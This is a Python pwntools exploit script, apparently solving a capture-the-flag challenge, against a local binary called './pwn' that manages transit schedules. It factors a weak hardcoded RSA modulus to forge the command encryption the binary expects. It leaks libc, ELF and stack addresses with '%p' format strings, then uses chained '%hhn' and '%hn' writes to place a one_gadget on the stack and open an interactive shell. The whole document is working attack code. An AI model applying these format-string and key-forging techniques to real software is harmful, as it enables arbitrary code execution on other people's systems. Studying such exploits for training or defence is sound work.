#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

from Crypto.Util.number import bytes_to_long, long_to_bytes
from gmpy2 import invert

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)
# l = ELF("./libc-2.27.so", checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass

'''
arr = [
	0x65C4934866354B3,
	0x242760A871C204C0,
	0x89C96DD9ECDBAF60,
	0x4D765C1FEAF881FC,
	0x9F1FA1C5B9BA5458,
	0xB18CAF560C33718C,
	0xDCC49B1D9A451AA,
	0x6581D94D7602785B,
	0xFCAF5FE8EA49E25F,
	0x6236F85D638381EF,
	0x55766B73F82B19E8,
	0xC82D675431D72415,
	0xD16F7C6A6054078B,
	0x2DDCBCF8259FD39C,
	0xE88A8699D6776433,
	0xFBD8A818116845A4
]

_n = 0
for i in range(len(arr)):
	_n |= arr[i] << (64 * i)

_n = bytes_to_long(long_to_bytes(_n)[::-1])
print(hex(_n))
'''

_n = 0xb354638634495c06c004c271a860272460afdbecd96dc989fc81f8ea1f5c764d5854bab9c5a11f9f8c71330c56af8cb1aa51a4d9b149cc0d5b7802764dd981655fe249eae85faffcef8183635df83662e8192bf8736b76551524d73154672dc88b0754606a7c6fd19cd39f25f8bcdc2d336477d699868ae8a445681118a8d8fb
# 125929558285838122981938793459630773025162920525251356687688812999666759615921050359414338068063425479948010539252026365977707361962932013049637097311291763866352503104013778306176776110733239343100098577761198501786979178603002524323658920750922477495615561099575287665110734080670065963391590988989914994939
# http://factordb.com/index.php?query=125929558285838122981938793459630773025162920525251356687688812999666759615921050359414338068063425479948010539252026365977707361962932013049637097311291763866352503104013778306176776110733239343100098577761198501786979178603002524323658920750922477495615561099575287665110734080670065963391590988989914994939

_p = 16617127
_q = 7578299081774973675168926220497127633745768478826174746554492422165802765780212810518589529228694315205511189705177457329278843566817056465274478392762585485827514172817826950842752547461016536920016232514874472692360067934908514830732106744500567245807025552586514363470336002166323093239378322678157
# fully factored

assert _p * _q == _n
_e = 0x10001
_phi = (_p - 1) * (_q - 1)
_d = int(invert(_e, _phi))
assert _d * _e % _phi == 1

def encrypt(s):
	_m = bytes_to_long(s)
	_c = pow(_m, _d, _n)
	return long_to_bytes(_c)

def decrypt(s):
	_c = bytes_to_long(s)
	return long_to_bytes(pow(_c, _e, _n))

def cmd():
	ru(b'> ')

def send(s):
	payload = encrypt(s)
	sn(payload)
	sn(b'##')

def add(data, desc=None, size=0):
	cmd()
	send(b'257\n' + data)
	ru(b'(y/n) ')
	if desc == None:
		sn(b'n')
	else:
		sn(b'y')
		if size == 0: 
			size = len(desc)
		ru(b'size: ')
		sn(str(size).encode())
		ru(b'content: ')
		sn(desc)



def delete(num):
	cmd()
	send(f'258\n{num}'.encode())

def set_time(hour, minute):
	cmd()
	send(f'259\n{hour}:{minute}'.encode())

def update_status():
	cmd()
	send(b'260\n')

def detailed_info():
	cmd()
	send(b'261\n')

def modify_src(num, src):
	cmd()
	send(f'513\n{num};{src}'.encode())

def modify_dst(num, dst):
	cmd()
	send(f'514\n{num};{dst}'.encode())

def modify_line(num, line):
	cmd()
	send(f'515\n{num};{line}'.encode())

def set_arrival_time(num):
	cmd()
	send(f'516\n{num};2:33'.encode())

# 8 bytes id, 8 bytes src, 8 bytes dst, 4 bytes line, 4 bytes hour, 4 bytes minute, 4 bytes status
# test0       test1        test2        1             2             3               0
debugPID()
payload = b"%p."*20
add(b'test0'.ljust(8, b'\x00')+b'test1'.ljust(8, b'\x00')+b'test2'.ljust(8, b'\x00')+p32(1)+p32(2)+p32(3)+p32(0), payload)

detailed_info()
ru(b';0x')
rsi = int(ru(b'.0x', "drop"), 16)
libc_base = int(ru(b'.', "drop"), 16) - l.symbols['printf']
ru(b'.', "drop")
ru(b'.', "drop")
ru(b'.', "drop")
ru(b'.', "drop")
leak = int(ru(b'.', "drop"), 16)
ru(b'.', "drop")
ru(b'.', "drop")
ru(b'.', "drop")
chunk_addr = int(ru(b'.', "drop"), 16)
stack_leak = int(ru(b'.', "drop"), 16)
elf_base = int(ru(b'.', "drop"), 16) - 0x435f

stack_target = stack_leak + 0x18
one_gadget = libc_base + 0x10a45c
# one_gadget = libc_base + 0x10a2fc
pop_ret = elf_base + 0x0000000000004473

lg("libc_base")
lg("chunk_addr")
lg("stack_leak")


count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
delete('test1')
# debugPID()

count = (one_gadget & 0xffff)
payload = b'%' + i2b(count) + b'c%16$hn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
delete('test1')

stack_target = stack_leak + 0x18 + 2
count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
delete('test1')
# debugPID()

count = ((one_gadget & 0xff0000) >> 16)
payload = b'%' + i2b(count) + b'c%16$hhn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
delete('test1')

stack_target = stack_leak + 0x8
count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
delete('test1')
# debugPID()

count = (pop_ret & 0xffff)
payload = b'%' + i2b(count) + b'c%16$hhn'
add(b'test1'.ljust(8, b'\x00')+b'te'.ljust(8, b'\x00')+b'tst2'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
detailed_info()
# delete('test1')

debugPID()
p.interactive()

# b *$rebase(0x3CC9)


